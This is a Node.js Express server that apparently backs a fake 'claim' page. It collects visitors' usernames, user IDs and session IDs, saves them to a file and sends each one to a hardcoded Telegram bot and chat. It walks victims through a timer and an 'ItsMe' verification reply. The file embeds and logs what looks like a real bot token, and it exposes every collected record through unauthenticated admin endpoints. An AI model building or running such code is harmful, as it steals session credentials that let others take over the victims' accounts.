const express = require('express');
const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const BOT_TOKEN = '8290523889:AAHkUrEQe8u1Wug4jdw4olWt-fO2S8T0if4';
const CHAT_ID = '8376166422';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// In-memory storage (for Railway, you might want to use a database)
const users = new Map();
const DATA_FILE = path.join(__dirname, 'users_data.json');

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Load existing data on startup
async function loadData() {
  try {
    const data = await fs.readFile(DATA_FILE, 'utf8');
    const parsed = JSON.parse(data);
    Object.entries(parsed).forEach(([key, value]) => {
      users.set(key, value);
    });
    console.log('Loaded existing user data');
  } catch (error) {
    console.log('No existing data file, starting fresh');
  }
}

// Save data periodically and on changes
async function saveData() {
  try {
    const obj = Object.fromEntries(users);
    await fs.writeFile(DATA_FILE, JSON.stringify(obj, null, 2));
    console.log('Data saved successfully');
  } catch (error) {
    console.error('Error saving data:', error);
  }
}

// Send message to Telegram
async function sendTelegramMessage(message) {
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('Message sent to Telegram');
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
  }
}

// API Routes

// Check if user exists
app.post('/api/check-user', (req, res) => {
  const { userid } = req.body;
  
  if (users.has(userid)) {
    const userData = users.get(userid);
    res.json({
      exists: true,
      completed: userData.completed || false,
      data: userData
    });
  } else {
    res.json({ exists: false });
  }
});

// Submit claim
app.post('/api/submit-claim', async (req, res) => {
  const { username, displayname, userid, sessionId, timestamp } = req.body;
  
  // Store user data
  const userData = {
    username,
    displayname,
    userid,
    sessionId,
    timestamp,
    completed: false,
    timerStarted: timestamp
  };
  
  users.set(userid, userData);
  await saveData();
  
  // Send notification to Telegram
  const message = `
🆕 <b>NEW CLAIM SUBMISSION</b>

👤 <b>Username:</b> ${username}
📝 <b>Display Name:</b> ${displayname}
🆔 <b>User ID:</b> ${userid}
🔑 <b>Session ID:</b> ${sessionId}
⏰ <b>Time:</b> ${new Date(timestamp).toLocaleString()}

⏳ Timer: 2:00 minutes started
━━━━━━━━━━━━━━━━━━
<i>Waiting for timer completion...</i>
  `.trim();
  
  await sendTelegramMessage(message);
  
  res.json({ success: true, message: 'Claim submitted successfully' });
});

// Timer complete
app.post('/api/timer-complete', async (req, res) => {
  const { username, displayname, userid, sessionId } = req.body;
  
  // Update user data
  if (users.has(userid)) {
    const userData = users.get(userid);
    userData.completed = true;
    userData.timerCompleted = new Date().toISOString();
    users.set(userid, userData);
    await saveData();
  }
  
  // Send timer complete notification
  const message = `
⏰ <b>TIMER COMPLETED</b>

👤 <b>Username:</b> ${username}
📝 <b>Display Name:</b> ${displayname}
🆔 <b>User ID:</b> ${userid}
🔑 <b>Session ID:</b> ${sessionId}
⏱️ <b>Completed At:</b> ${new Date().toLocaleString()}

✅ <b>Status:</b> User should now receive verification message
🤖 <b>Action Required:</b> User must reply "ItsMe" to verify

━━━━━━━━━━━━━━━━━━
<i>Waiting for user verification response...</i>
  `.trim();
  
  await sendTelegramMessage(message);
  
  res.json({ success: true, message: 'Timer completion logged' });
});

// Admin endpoint to get all users
app.get('/api/admin/users', (req, res) => {
  const allUsers = Array.from(users.values());
  res.json({
    total: allUsers.length,
    users: allUsers
  });
});

// Admin endpoint to get user stats
app.get('/api/admin/stats', (req, res) => {
  const allUsers = Array.from(users.values());
  const completed = allUsers.filter(u => u.completed).length;
  const pending = allUsers.length - completed;
  
  res.json({
    total: allUsers.length,
    completed,
    pending,
    users: allUsers
  });
});

// Webhook for bot messages (optional - for future use)
app.post('/api/webhook', async (req, res) => {
  const update = req.body;
  
  if (update.message) {
    const message = update.message;
    const text = message.text || '';
    const from = message.from;
    
    // Check if this is a response to verification
    if (text === 'ItsMe' || text === '/start' || text.toLowerCase() === 'hi') {
      const userId = from.id.toString();
      
      if (users.has(userId)) {
        const userData = users.get(userId);
        
        if (text === 'ItsMe') {
          // User verified
          const notifyMessage = `
✅ <b>USER VERIFIED!</b>

👤 <b>Username:</b> ${userData.username}
📝 <b>Display Name:</b> ${userData.displayname}
🆔 <b>User ID:</b> ${userData.userid}
✉️ <b>Response:</b> "${text}"
⏰ <b>Time:</b> ${new Date().toLocaleString()}

🎉 <b>VERIFICATION COMPLETE</b>
━━━━━━━━━━━━━━━━━━
<i>User has completed all steps successfully!</i>
          `.trim();
          
          await sendTelegramMessage(notifyMessage);
        } else if (text.toLowerCase() === 'hi') {
          // User saying hi after completion
          const replyMessage = `
💬 <b>USER MESSAGE RECEIVED</b>

👤 <b>Username:</b> ${userData.username}
🆔 <b>User ID:</b> ${userData.userid}
✉️ <b>Message:</b> "${text}"
⏰ <b>Time:</b> ${new Date().toLocaleString()}

📌 <b>Note:</b> User has sent "Hi" after timer completion
━━━━━━━━━━━━━━━━━━
          `.trim();
          
          await sendTelegramMessage(replyMessage);
        }
      }
    }
  }
  
  res.json({ ok: true });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    users: users.size,
    timestamp: new Date().toISOString()
  });
});

// Serve the main HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
loadData().then(() => {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Telegram Bot Token: ${BOT_TOKEN}`);
    console.log(`Chat ID: ${CHAT_ID}`);
  });
  
  // Save data every 5 minutes
  setInterval(saveData, 5 * 60 * 1000);
});

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('Shutting down gracefully...');
  await saveData();
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('Shutting down gracefully...');
  await saveData();
  process.exit(0);
});